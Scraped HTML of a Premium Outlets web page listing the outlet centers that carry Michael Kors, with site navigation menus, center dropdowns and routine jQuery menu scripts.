                                                Johnson Creek Premium Outlets
                                            </option>
                                        
                                            <option data-title="Pleasant Prairie Premium Outlets" data-short="pleasantprairie" data-address="11211 120th Avenue" data-city="Pleasant Prairie" data-state="WI" data-zip="53158" value="90">
                                                Pleasant Prairie Premium Outlets
                                            </option>
                                        
                                    </select>
                                    <script>
                                            var newOption = $('<option value="999" data-title="Clarksburg Premium Outlets" data-short="Clarksburg" data-address="Opening 2015" data-city="Clarksburg" data-state="MD" data-zip="">Clarksburg Premium Outlets</option>');
                                            newOption.insertAfter('#selectstate optgroup[label="Maryland"]');


                                    </script>
                                    <div id="state-centers-list"></div>
                                </div><!--/dropdown-section-->
                            </li>
                            <li class="nav-header">INTERNATIONAL</li>
                            <li>
                                <div class="dropdown-section">

                                    <!--<select name="selectcountry" id="selectcountry" class="selectmenu" onchange="if (this.selectedIndex > 0) {window.open(this[this.selectedIndex].value,'_blank');}">-->
                                    <select name="selectcountry" id="selectcountry" class="selectmenu mb-20">
                                        <option value="">SELECT A COUNTRY</option>
                                        <option disabled="disabled">
                                        <optgroup label="Canada"></optgroup>
                                        <option value="/outlets/outlet.asp?id=109">Toronto Premium Outlets</option>
                                        <option value="/outlets/outlet.asp?id=114">Premium Outlets Montreal</option>
                                        <option disabled="disabled">
                                        <hr>
                                        </option>
                                        <optgroup label="Japan"></optgroup>
                                        <option value="http://www.premiumoutlets.co.jp/ami/">Ami Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.jp/rinku/index.html">Rinku Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.jp/gotemba/index.html">Gotemba Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.jp/sano/index.html">Sano Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.jp/tosu/index.html">Tosu Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.jp/toki/index.php">Toki Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.jp/sendaiizumi/">Sendai-Izumi Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.jp/kobesanda/index.html">Kobe-Sanda Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.jp/en/shisui/">Shisui Premium Outlets</option>


                                        <!--<option disabled="disabled">
                                            _________________________________
                                        </option>-->
                                        <option disabled="disabled">
                                            <hr>
                                        </option>
                                        <optgroup label="Korea"></optgroup>

                                        <option value="http://www.premiumoutlets.co.kr/">Yeoju Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.kr/01_centers/main_paju.asp">Paju Premium Outlets</option>
                                        <option value="http://www.premiumoutlets.co.kr/eng/01_centers/main_busan.asp">Busan Premium Outlets</option>


                                        <option disabled="disabled">
                                            <hr>
                                        </option>
                                        <optgroup label="Malaysia"></optgroup>
                                        <option value="http://www.premiumoutlets.com.my/">Johor Premium Outlets</option>

                                        <option disabled="disabled">
                                            <hr>
                                        </option>
                                        <optgroup label="Mexico"></optgroup>
                                        <option value="http://www.premiumoutlets.com.mx/index_sp.shtml">Premium Outlets Punta Norte</option>
                                    </select>

                                    <div id="country-centers-list"></div>
                                </div><!--/dropdown-section-->
                            </li>
                            <li class="last"><a href="http://www.premiumoutlets.com/centers/index.asp">View All</a></li>
                        </ul>
                    </li>
                    <li><a href="http://www.premiumoutlets.com/sales/index.asp" id="salesAct">SALES &amp; EVENTS</a></li>
                    <li><a href="http://www.premiumoutlets.com/travel/index.asp" id="travelAct">TRAVEL &amp; TOURISM</a></li>
					
                    <li><a href="http://www.premiumoutlets.com/giftcards/giftcard.asp" id="giftAct">GIFTCARDS</a></li>
					
                </ul>
            </div><!--/.nav-collapse -->
        </div>
    </div>
</div>



<script>
    $('#selectcountry').on('change', function () {
        var url = $(this).val(),
            text = $(this).find('option:selected').text();

        var ua = window.navigator.userAgent;
        var msie = ua.indexOf("MSIE ");

        if (msie > 0)      // If Internet Explorer, return version number
        //alert(parseInt(ua.substring(msie + 5, ua.indexOf(".", msie))));
            openWindow = location.reload(url);
        else                 // If another browser, return 0
        //alert('otherbrowser');
            openWindow = window.open(url);

        return false;

        //openWindow = window.open(url);

        if (openWindow == null || typeof (openWindow) == 'undefined' || openWindow.screenX === 0) {
            $('#country-centers-list').fadeOut('slow', function () {
                $('#country-centers-list').css('margin-top', 10).html('<a href="' + url + '" target="_blank">View ' + text + '</a>').fadeIn('slow');
            });
        }
    });

    var centersDropdown = (function() {
        var dropdownMenu = $('.dropdown-menu'),
            timer = null,
            persist = false;

        var stopPersist = function() {
            persist = false;
        };

        var persistDropdown = function() {
            persist = true;
        };

        var closeDropdown = function() {
            timer = setTimeout(function() {
                if ( persist === false ) {
                    dropdownMenu.removeClass('dropdown-menu-active');
                }
            }, 400);
        };

        var openDropdown = function() {
            clearTimeout(timer);

            dropdownMenu.addClass('dropdown-menu-active');
        };

        $('.nav').find('.dropdown')
            .on('mouseenter', openDropdown);

        dropdownMenu
            .on('mouseenter', openDropdown)
            .on('mouseleave', closeDropdown);

        $('.dropdown-menu').find('select')
            .on('focus', persistDropdown)
            .on('change', stopPersist)
            .on('blur', stopPersist);

        $('.dropdown').on('mouseleave', function(){
            timer = setTimeout(function() {
                if ( persist === false ) {
                    dropdownMenu.removeClass('dropdown-menu-active');
                }
            }, 400);
        })
    })();
</script>

        <div class="container vipbar">
            
                <ul class="inline">                    
                
					<li><a href="https://www.premiumoutlets.com/vip/vipLounge.asp">VIP CLUB</a></li>
                    <li><img src="/images/diamond.png"></li>
                    <li class="bk">Hi, Guest</li>
                    <li><img src="/images/diamond.png"></li>
                    <li><a href="https://www.premiumoutlets.com/vip/index.asp" class="arrow">Log in</a></li>
                <li><a href="https://www.premiumoutlets.com/vip/register.asp" class="arrow">Register</a></li>
                
                </ul>
            
                    <!--<ul id="VIPNav">
                        <li class="vipHome"><a href="vipLounge.asp">VIP HOME</a></li>
                       <!-- <li class="vipCoupon"><a href="coupons.asp?outletid=">EXCLUSIVE COUPONS & VIP COUPON BOOK </a></li>
                        <li class="aroundTown"><a href="promotions.asp?outletid=">DEALS AROUND TOWN</a></li> -->
                        <!--<li class="special"><a href="special.asp">BEHIND THE VELVET ROPE</a></li>
                        <li class="faq"><a href="faq.asp">VIP FAQS</a></li>
                    </ul>-->

        </div>
        <div class="container">
            <div class="row">
                <div class="span2 center">
                    <!--Sidebar Navigation Bar starts here-->
<h1 class="title mb-15">BRANDS BY CATEGORY</h1>
<ul id="BrandsNav" class="unstyled side-nav">

    <li><a href="index.asp?catid=1">Designer Fashions & Sportswear</a></li>

    <li><a href="index.asp?catid=3">For Children</a></li>

    <li><a href="index.asp?catid=2">Shoes</a></li>

    <li><a href="index.asp?catid=4">Fine Leather & Luggage</a></li>

    <li><a href="index.asp?catid=6">Accessories & Jewelry</a></li>

    <li><a href="index.asp?catid=7">Housewares & Home Furnishings</a></li>

    <li><a href="index.asp?catid=5">Gifts & Specialty Items</a></li>

</ul>
<hr>
<h1 class="title mb-10">BRANDS BY NAME</h1>
<ul class="inline" id="alpha">
    <li><a href="alphabetical.asp?id=a">A</a></li>
    <li><a href="alphabetical.asp?id=b">B</a></li>
    <li><a href="alphabetical.asp?id=c">C</a></li>
    <li><a href="alphabetical.asp?id=d">D</a></li>
    <li><a href="alphabetical.asp?id=e">E</a></li>
    <li><a href="alphabetical.asp?id=f">F</a></li>
    <li><a href="alphabetical.asp?id=g">G</a></li>
    <li><a href="alphabetical.asp?id=h">H</a></li>
    <li><a href="alphabetical.asp?id=i">I</a></li>
    <li><a href="alphabetical.asp?id=j">J</a></li>
    <li><a href="alphabetical.asp?id=k">K</a></li>
    <li><a href="alphabetical.asp?id=l">L</a></li>
    <li><a href="alphabetical.asp?id=m">M</a></li>
    <li><a href="alphabetical.asp?id=n">N</a></li>
    <li><a href="alphabetical.asp?id=o">O</a></li>
    <li><a href="alphabetical.asp?id=p">P</a></li>
    <li><a href="alphabetical.asp?id=q">Q</a></li>
    <li><a href="alphabetical.asp?id=r">R</a></li>
    <li><a href="alphabetical.asp?id=s">S</a></li>
    <li><a href="alphabetical.asp?id=t">T</a></li>
    <li><a href="alphabetical.asp?id=u">U</a></li>
    <li><a href="alphabetical.asp?id=v">V</a></li>
    <li><a href="alphabetical.asp?id=w">W</a></li>
    <li><a href="alphabetical.asp?id=x">X</a></li>
    <li><a href="alphabetical.asp?id=y">Y</a></li>
    <li><a href="alphabetical.asp?id=z">Z</a></li>
</ul>
<hr>
<h1 class="title mb-10">BRANDS BY CENTER</h1>
<p>
    <select class="dropDown" name="sel_center" onchange="if (this.selectedIndex > 0) location. href=this[this.selectedIndex].value;">
        <option value="">
            Select a Center</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=52">
            Albertville Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=5">
            Allen Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=8">
            Aurora Farms Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=82">
            Birch Run Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=97">
            Calhoun Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=20">
            Camarillo Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=66">
            Carlsbad Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=48">
            Carolina Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=111">
            Charlotte Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=63">
            Chicago Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=79">
            Cincinnati  Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=12">
            Clinton Crossing Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=28">
            Columbia Gorge Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=59">
            The Crossings Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=6">
            Desert Hills Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=51">
            Edinburgh Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=92">
            Ellenton Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=93">
            Florida Keys Outlet Center</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=27">
            Folsom Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=86">
            Gaffney Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=23">
            Gilroy Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=106">
            Grand Prairie Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=85">
            Grove City Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=83">
            Gulfport Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=100">
            Hagerstown Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=77">
            Houston Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=98">
            Huntley Outlet Center</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=54">
            Jackson Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=78">
            Jersey Shore Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=53">
            Johnson Creek Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=11">
            Kittery Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=76">
            Las Americas Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=58">
            Las Vegas North Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=61">
            Las Vegas South Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=87">
            Lebanon Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=81">
            Lee Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=14">
            Leesburg Corner Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=13">
            Liberty Village Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=18">
            Lighthouse Place Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=107">
            Livermore Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=101">
            Merrimack Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=25">
            Napa Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=95">
            Naples Outlet Center</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=49">
            North Bend Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=16">
            North Georgia Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=96">
            Orlando International Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=17">
            Orlando Vineland Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=57">
            Osage Beach Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=94">
            Outlet Marketplace</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=24">
            Petaluma Village Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=75">
            Philadelphia Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=105">
            Phoenix Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=91">
            Pismo Beach Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=90">
            Pleasant Prairie Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=114">
            Premium Outlets Montreal</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=80">
            Puerto Rico Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=99">
            Queenstown Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=74">
            Rio Grande Valley Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=73">
            Round Rock Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=88">
            San Marcos Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=71">
            Seattle Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=102">
            Silver Sands Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=55">
            St. Augustine Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=108">
            St. Louis Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=109">
            Toronto Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=112">
            Twin Cities Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=50">
            Vacaville Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=29">
            Waikele Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=9">
            Waterloo Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=89">
            Williamsburg Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=110">
            Woodburn Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=7">
            Woodbury Common Premium Outlets</option>
        
        <option value="http://www.premiumoutlets.com/outlets/store_listing.asp?id=10">
            Wrentham Village Premium Outlets</option>
        
    </select>
</p>
<!--Sidebar Navigation Bar ends here-->

                </div>
                <div class="span10 center">
                    <img src="/images/img-header-brands.jpg" alt="Brands"/>
                    
                    <div id="Padder">
                        
                        <h2 class="brandsCategory title">Michael Kors</h2><hr>
                        <ul class="brandsOutlet unstyled">
                        
                            <li><a href="../outlets/outlet.asp?id=52">Albertville Premium Outlets</a> - Albertville, MN (Minneapolis Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=5">Allen Premium Outlets</a> - Allen, TX (Dallas Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=8">Aurora Farms Premium Outlets</a> - Aurora, OH (Cleveland Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=20">Camarillo Premium Outlets</a> - Camarillo, CA (Los Angeles Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=66">Carlsbad Premium Outlets</a> - Carlsbad, CA (San Diego Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=111">Charlotte Premium Outlets</a> - Charlotte, NC (South West Charlotte area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=63">Chicago Premium Outlets</a> - Aurora, IL (Chicago Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=79">Cincinnati  Premium Outlets</a> - Monroe, OH (Cincinnati/Dayton Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=12">Clinton Crossing Premium Outlets</a> - Clinton, CT (Connecticut Shoreline)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=59">The Crossings Premium Outlets</a> - Tannersville, PA (The Poconos)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=6">Desert Hills Premium Outlets</a> - Cabazon, CA (Palm Springs/LA Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=51">Edinburgh Premium Outlets</a> - Edinburgh, IN (Indianapolis Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=92">Ellenton Premium Outlets</a> - Ellenton, FL (Tampa Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=92">Ellenton Premium Outlets</a> - Ellenton, FL (Tampa Area)&nbsp;<span class='new-store'>- Now Open</span></li>
                        
                            <li><a href="../outlets/outlet.asp?id=86">Gaffney Premium Outlets</a> - Gaffney, SC (Greenville/Charlotte Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=23">Gilroy Premium Outlets</a> - Gilroy, CA (San Jose Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=106">Grand Prairie Premium Outlets</a> - Grand Prairie, TX (Dallas/Ft. Worth Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=83">Gulfport Premium Outlets</a> - Gulfport, MS (Mississippi Gulf Coast)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=77">Houston Premium Outlets</a> - Cypress, TX (Houston Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=78">Jersey Shore Premium Outlets</a> - Tinton Falls, NJ (Jersey Shore Region)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=58">Las Vegas North Premium Outlets</a> - Las Vegas, NV (Downtown/North of the Strip)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=61">Las Vegas South Premium Outlets</a> - Las Vegas, NV (South of the Strip)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=81">Lee Premium Outlets</a> - Lee, MA (The Berkshires)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=14">Leesburg Corner Premium Outlets</a> - Leesburg, VA (Washington D.C. Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=13">Liberty Village Premium Outlets</a> - Flemington, NJ (Central New Jersey)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=18">Lighthouse Place Premium Outlets</a> - Michigan City, IN (Chicago Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=107">Livermore Premium Outlets</a> - Livermore, CA (San Francisco Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=101">Merrimack Premium Outlets</a> - Merrimack, NH (Nashua/North Boston Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=25">Napa Premium Outlets</a> - Napa, CA (Napa Valley)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=16">North Georgia Premium Outlets</a> - Dawsonville, GA (Atlanta Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=96">Orlando International Premium Outlets</a> - Orlando, FL (Near Universal Orlando)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=17">Orlando Vineland Premium Outlets</a> - Orlando, FL (Near Walt Disney World)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=75">Philadelphia Premium Outlets</a> - Limerick, PA (Philadelphia Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=105">Phoenix Premium Outlets</a> - Chandler, AZ (Phoenix Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=90">Pleasant Prairie Premium Outlets</a> - Pleasant Prairie, WI (Milwaukee Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=114">Premium Outlets Montreal</a> - Mirabel, Quebec (Montreal Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=80">Puerto Rico Premium Outlets</a> - Barceloneta, PR (San Juan Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=99">Queenstown Premium Outlets</a> - Queenstown, MD (Annapolis Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=74">Rio Grande Valley Premium Outlets</a> - Mercedes, TX (McAllen Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=73">Round Rock Premium Outlets</a> - Round Rock, TX (Austin Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=88">San Marcos Premium Outlets</a> - San Marcos, TX (Austin/San Antonio Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=71">Seattle Premium Outlets</a> - Tulalip, WA (Seattle Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=102">Silver Sands Premium Outlets</a> - Destin, FL (Near Pensacola/Panama City Beach)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=108">St. Louis Premium Outlets</a> - Chesterfield, MO (St. Louis Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=109">Toronto Premium Outlets</a> - Halton Hills, Ontario, Ontario (Toronto Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=112">Twin Cities Premium Outlets</a> - Eagan, MN (Saint Paul Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=50">Vacaville Premium Outlets</a> - Vacaville, CA (San Francisco & Sacramento Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=29">Waikele Premium Outlets</a> - Waipahu, HI (Honolulu Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=89">Williamsburg Premium Outlets</a> - Williamsburg, VA (Virginia Beach/Richmond Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=7">Woodbury Common Premium Outlets</a> - Central Valley, NY (New York City Area)</li>
                        
                            <li><a href="../outlets/outlet.asp?id=10">Wrentham Village Premium Outlets</a> - Wrentham, MA (Boston Area)</li>
                        
                        <br></ul>
                        
                        <h3 class="brandsCategory title">Michael Kors</h3><hr>
                        <ul class="brandsOutlet unstyled">
                        
                            <li><a href="../outlets/outlet.asp?id=76">Las Americas Premium Outlets</a> - San Diego, CA (San Diego Area)</li>
                        
                        <br></ul>
                        
                    </div><!--Search Results section ends here-->
                </div><!--end of span10-->
            </div><!--end of the row-->
            
<ul id="scroller">
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1">ADIDAS</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=16">ANN&nbsp;TAYLOR</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=216">ARMANI&nbsp;OUTLET</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=7">A|X&nbsp;ARMANI&nbsp;EXCHANGE</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=44">BANANA&nbsp;REPUBLIC</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=47">BARNEYS&nbsp;NEW&nbsp;YORK</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=53">BCBGMAXAZRIA</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=82">BURBERRY</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1097">CALVIN&nbsp;KLEIN</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=96">CARTER'S</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=115">COACH</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=119">COLE&nbsp;HAAN</a></li>
    <li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1911">COLUMBIA&nbsp;SPORTSWEAR</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1537">CONVERSE</a></li>
    <li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1954">DAVID&nbsp;YURMAN</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1513">DIANE&nbsp;VON&nbsp;FURSTENBERG</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=2123">DIESEL</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=109">DIOR</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=153">DKNY</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=151">DOLCE&nbsp;&amp;&nbsp;GABBANA</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1112">ELIE&nbsp;TAHARI</a></li>
    <li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=2291">ELIZABETH&nbsp;ARDEN</a></li>
    <li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=561">ERMENEGILDO&nbsp;ZEGNA</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=175">ESCADA</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=178">ETRO</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=189">FENDI</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=205">FURLA</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=207">GAP&nbsp;OUTLET</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=222">GUCCI</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=223">GUESS</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1660">GYMBOREE</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=8">HUGO&nbsp;BOSS</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=257">J.CREW</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=2576">JAMES PERSE</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1793">JIMMY&nbsp;CHOO</a></li>
    <li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=2003">JOE'S&nbsp;JEANS</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=655">KATE&nbsp;SPADE&nbsp;NEW&nbsp;YORK</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=282">KENNETH&nbsp;COLE</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=286">LA&nbsp;PERLA</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=288">LACOSTE</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=331">MAXMARA</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=630">MAXSTUDIO.COM</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=1512">MICHAEL&nbsp;KORS</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=352">NAUTICA</a></li>
    <li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=354">NEIMAN&nbsp;MARCUS&nbsp;LAST&nbsp;CALL</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=2297">NEW&nbsp;YORK&nbsp;&amp;&nbsp;COMPANY</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=358">NIKE</a></li>
	<li><a href="http://www.premiumoutlets.com/brands/brands_3rd_level.asp?id=374">OSHKOSH&nbsp;B'GOSH</a></li>
